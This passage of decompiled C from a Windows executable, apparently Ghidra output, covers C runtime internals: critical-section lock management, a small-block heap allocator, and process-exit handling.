      if (iVar1 == 0) {
        (&DAT_00422488)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



void FUN_0040df24(void)

{
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422488;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
      FUN_0040b61e();
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4225a8);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422488;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4225a8);
  return;
}



void __cdecl FUN_0040df7b(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00422488)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040df92(void)

{
  LPVOID *ppvVar1;
  LPVOID pvVar2;
  undefined4 *puVar3;
  int iVar4;
  int unaff_EBP;
  undefined4 uVar5;
  
  FUN_0040d634(&DAT_00420520,0xc);
  uVar5 = 1;
  *(undefined4 *)(unaff_EBP + -0x1c) = 1;
  if (DAT_00423e74 == 0) {
    FUN_0040f05f();
    FUN_0040eeb4(0x1e);
    FUN_0040ec00(0xff);
  }
  ppvVar1 = (LPVOID *)(&DAT_00422488 + *(int *)(unaff_EBP + 8) * 2);
  if (*ppvVar1 == (LPVOID)0x0) {
    pvVar2 = FUN_00413b52(0x18);
    if (pvVar2 == (LPVOID)0x0) {
      puVar3 = (undefined4 *)FUN_0040caaa();
      *puVar3 = 0xc;
      uVar5 = 0;
    }
    else {
      FUN_0040e055(10);
      *(undefined4 *)(unaff_EBP + -4) = 0;
      if (*ppvVar1 == (LPVOID)0x0) {
        iVar4 = FUN_0041467b();
        if (iVar4 == 0) {
          FUN_0040b61e();
          puVar3 = (undefined4 *)FUN_0040caaa();
          *puVar3 = 0xc;
          *(undefined4 *)(unaff_EBP + -0x1c) = 0;
        }
        else {
          *ppvVar1 = pvVar2;
        }
      }
      else {
        FUN_0040b61e();
      }
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_0040e04c();
      uVar5 = *(undefined4 *)(unaff_EBP + -0x1c);
    }
  }
  return uVar5;
}



void FUN_0040e04c(void)

{
  FUN_0040df7b(10);
  return;
}



void __cdecl FUN_0040e055(int param_1)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_00422488)[param_1 * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = FUN_0040df92();
    if (iVar1 == 0) {
      FUN_0040ebac(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00422488)[param_1 * 2]);
  return;
}



uint __cdecl FUN_0040e088(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_00425798;
  while( true ) {
    if (DAT_00425794 * 0x14 + DAT_00425798 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



void __cdecl FUN_0040e0b8(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_00423e70 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_004257a8 * 0x8000 + DAT_00423e70[3]),0x8000,0x4000);
        DAT_00423e70[2] = DAT_00423e70[2] | 0x80000000U >> ((byte)DAT_004257a8 & 0x1f);
        *(undefined4 *)(DAT_00423e70[4] + 0xc4 + DAT_004257a8 * 4) = 0;
        *(char *)(DAT_00423e70[4] + 0x43) = *(char *)(DAT_00423e70[4] + 0x43) + -1;
        if (*(char *)(DAT_00423e70[4] + 0x43) == '\0') {
          DAT_00423e70[1] = DAT_00423e70[1] & 0xfffffffe;
        }
        if (DAT_00423e70[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_00423e70[3],0,0x8000);
          HeapFree(DAT_00423e74,0,(LPVOID)DAT_00423e70[4]);
          FUN_0040c2f0(DAT_00423e70,DAT_00423e70 + 5,
                       (DAT_00425794 * 0x14 - (int)DAT_00423e70) + -0x14 + DAT_00425798);
          DAT_00425794 = DAT_00425794 + -1;
          if (DAT_00423e70 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_004257a0 = DAT_00425798;
        }
      }
      DAT_00423e70 = param_1;
      DAT_004257a8 = uVar14;
    }
  }
  return;
}



undefined4 * FUN_0040e3ce(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_00425794 == DAT_004257a4) {
    pvVar1 = HeapReAlloc(DAT_00423e74,0,DAT_00425798,(DAT_004257a4 + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_004257a4 = DAT_004257a4 + 0x10;
    DAT_00425798 = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_00425794 * 0x14 + (int)DAT_00425798);
  pvVar1 = HeapAlloc(DAT_00423e74,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_00425794 = DAT_00425794 + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_00423e74,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



int __cdecl FUN_0040e47e(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



undefined4 __cdecl FUN_0040e586(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



int * __cdecl FUN_0040e867(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_00425798 + DAT_00425794 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_004257a0;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_00425798;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_004257a0 && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_004257a0) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_00425798;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_004257a0 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_004257a0) && (param_1 = FUN_0040e3ce(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = FUN_0040e47e((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_004257a0 = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_0040eb09;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_0040eb09:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_00423e70)) && (local_8 == DAT_004257a8)) {
    DAT_00423e70 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



void __cdecl FUN_0040eb4c(int param_1)

{
  DAT_00423e74 = HeapCreate((uint)(param_1 == 0),0x1000,0);
  if (DAT_00423e74 == (HANDLE)0x0) {
    return;
  }
  DAT_00425790 = 1;
  return;
}



void __cdecl FUN_0040eb7c(LPCWSTR param_1)

{
  HMODULE pHVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 1000;
  do {
    Sleep(dwMilliseconds);
    pHVar1 = GetModuleHandleW(param_1);
    dwMilliseconds = dwMilliseconds + 1000;
    if (60000 < dwMilliseconds) {
      return;
    }
  } while (pHVar1 == (HMODULE)0x0);
  return;
}



void __cdecl FUN_0040ebac(int param_1)

{
  code *pcVar1;
  
  FUN_0040f05f();
  FUN_0040eeb4(param_1);
  pcVar1 = (code *)FUN_0040cb6e(DAT_004225ac);
  (*pcVar1)(0xff);
  return;
}



void __cdecl FUN_0040ebd5(undefined4 param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_mscoree_dll_0041c340);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_CorExitProcess_0041c330);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



void FUN_0040ec00(UINT param_1)

{
  FUN_0040ebd5(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0040ec18(void)

{
  FUN_0040e055(8);
  return;
}



void FUN_0040ec21(void)

{
  FUN_0040df7b(8);
  return;
}



void __cdecl FUN_0040ec2a(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



void __cdecl FUN_0040ec47(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



int __cdecl FUN_0040ec6b(undefined4 param_1)

{
  uint uVar1;
  int iVar2;
  
  if (DAT_00420038 != (code *)0x0) {
    uVar1 = FUN_00414770(0x420038);
    if (uVar1 != 0) {
      (*DAT_00420038)(param_1);
    }
  }
  FUN_00414e27();
  iVar2 = FUN_0040ec47((undefined **)&DAT_0041c218,(undefined **)&DAT_0041c230);
  if (iVar2 == 0) {
    FUN_00411686(&LAB_00413a8e);
    FUN_0040ec2a((undefined **)&DAT_0041c214);
    if (DAT_0042578c != (code *)0x0) {
      uVar1 = FUN_00414770(0x42578c);
      if (uVar1 != 0) {
        (*DAT_0042578c)(0,2,0);
      }
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040ecf0(void)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420540,0x18);
  FUN_0040e055(8);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (DAT_00423ea8 != 1) {
    _DAT_00423ea4 = 1;
    DAT_00423ea0 = *(undefined *)(unaff_EBP + 0x10);
    if (*(int *)(unaff_EBP + 0xc) == 0) {
      piVar1 = (int *)FUN_0040cb6e(DAT_00425784);
      *(int **)(unaff_EBP + -0x28) = piVar1;
      if (piVar1 != (int *)0x0) {
        piVar2 = (int *)FUN_0040cb6e(DAT_00425780);
        *(int **)(unaff_EBP + -0x24) = piVar2;
        *(int **)(unaff_EBP + -0x1c) = piVar1;
        *(int **)(unaff_EBP + -0x20) = piVar2;
        while( true ) {
          piVar2 = piVar2 + -1;
          *(int **)(unaff_EBP + -0x24) = piVar2;
          if (piVar2 < piVar1) break;
          iVar3 = FUN_0040cb65();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)FUN_0040cb6e(*piVar2);
            iVar3 = FUN_0040cb65();
            *piVar2 = iVar3;
            (*pcVar4)();
            iVar3 = FUN_0040cb6e(DAT_00425784);
            piVar1 = (int *)FUN_0040cb6e(DAT_00425780);
            if ((*(int *)(unaff_EBP + -0x1c) != iVar3) || (*(int **)(unaff_EBP + -0x20) != piVar1))
            {
              *(int *)(unaff_EBP + -0x1c) = iVar3;
              *(int *)(unaff_EBP + -0x28) = iVar3;
              *(int **)(unaff_EBP + -0x20) = piVar1;
              *(int **)(unaff_EBP + -0x24) = piVar1;
              piVar2 = piVar1;
            }
            piVar1 = *(int **)(unaff_EBP + -0x28);
          }
        }
      }
      FUN_0040ec2a((undefined **)&DAT_0041c240);
    }
    FUN_0040ec2a((undefined **)&DAT_0041c248);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_0040ee07();
  if (*(int *)(unaff_EBP + 0x10) == 0) {
    DAT_00423ea8 = 1;
    FUN_0040df7b(8);
    FUN_0040ec00(*(UINT *)(unaff_EBP + 8));
    if (*(int *)(unaff_EBP + 0x10) != 0) {
      FUN_0040df7b(8);
    }
    return;
  }
  return;
}



void FUN_0040ee07(void)

{
  int unaff_EBP;
  
